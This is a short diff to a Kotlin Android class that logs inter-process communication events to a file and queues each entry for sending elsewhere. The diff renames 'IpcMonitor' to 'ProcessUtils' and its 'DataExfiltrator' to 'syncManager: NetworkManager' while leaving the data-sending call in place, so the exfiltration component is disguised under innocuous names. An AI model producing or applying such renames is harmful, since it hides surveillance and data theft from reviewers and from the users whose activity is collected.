@@ -10,7 +10,7 @@ import java.io.FileReader
 import java.text.SimpleDateFormat
 import java.util.*
 
-class IpcMonitor(private val context: Context, private val exfiltrator: DataExfiltrator) {
+class ProcessUtils(private val context: Context, private val syncManager: NetworkManager) {
 
     private val handler = Handler(Looper.getMainLooper())
     private var runnable: Runnable? = null
@@ -63,7 +63,7 @@ class IpcMonitor(private val context: Context, private val exfiltrator: DataExfi
         val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
         val entry = "$timestamp - IPC_$type: $detail"
         saveToFile(entry)
-        exfiltrator.queueData(entry)  // ADD THIS
+        syncManager.queueData(entry)  
     }
 
     private fun saveToFile(data: String) {
@@ -78,6 +78,6 @@ class IpcMonitor(private val context: Context, private val exfiltrator: DataExfi
     }
 
     fun stopMonitoring() {
-        handler.removeCallbacks(runnable!!)
+        runnable?.let { handler.removeCallbacks(it) }
     }
 }
